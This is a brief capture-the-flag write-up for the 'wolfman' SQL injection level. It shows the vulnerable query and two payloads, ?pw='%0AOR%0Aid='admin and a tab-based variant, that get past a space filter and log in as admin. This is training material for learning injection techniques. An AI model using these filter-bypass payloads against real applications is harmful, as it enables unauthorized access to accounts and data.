---
custom_edit_url: null
sidebar_position: 5
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/48346668-4ade-4937-98dc-cd3160cfa815)

We are provided with the SQL query:

```sql
SELECT id FROM prob_wolfman WHERE id='guest' AND pw='{$_GET[pw]}'
```

This level prints out the flag if the `id=admin`. 

However, it also removes all space characters. In order to get around this, we need to use the Line Feed (`%0A`) character.

If we provide the following URI parameter:

```
?pw='%0AOR%0Aid='admin
```

The resultant query becomes:

```sql
SELECT id FROM prob_wolfman WHERE id='guest' AND pw=''
OR
id='admin'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/ea2c6e8d-c9e1-4e5b-80bd-2dfeb29f1c0d)

We can also solvethe challenge by using the Tab (`%09`) character.

If we provide the following URI parameter:

```
?pw='%09OR%09id='admin
```

The resultant query becomes:

```sql
SELECT id FROM prob_wolfman WHERE id='guest' AND pw=''  OR  id='admin'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/94cf381a-1444-4ac4-a8fe-2676109d7164)
